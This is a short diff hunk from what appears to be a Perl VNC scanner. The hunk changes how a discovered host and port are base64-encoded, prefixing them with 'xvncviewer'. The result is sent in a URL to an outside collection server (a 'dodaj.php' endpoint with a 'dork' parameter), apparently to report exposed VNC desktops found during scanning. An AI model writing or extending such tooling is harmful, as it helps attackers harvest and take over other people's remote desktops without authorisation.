@@ -36,7 +36,7 @@ if (unpack("H*", $data) =~ /00000001/) {
  
 $client->close();
  use MIME::Base64;
- my $spierdalaj = encode_base64("$hostname:$port", '');
+ my $spierdalaj = encode_base64("xvncviewer $hostname:$port", '');
  my $ne = 'http://vte.mygamesonline.org/dodaj.php?p=vnc&link='.$spierdalaj.'&dork=nie';
 alarm(120);
 if (defined($security)) {
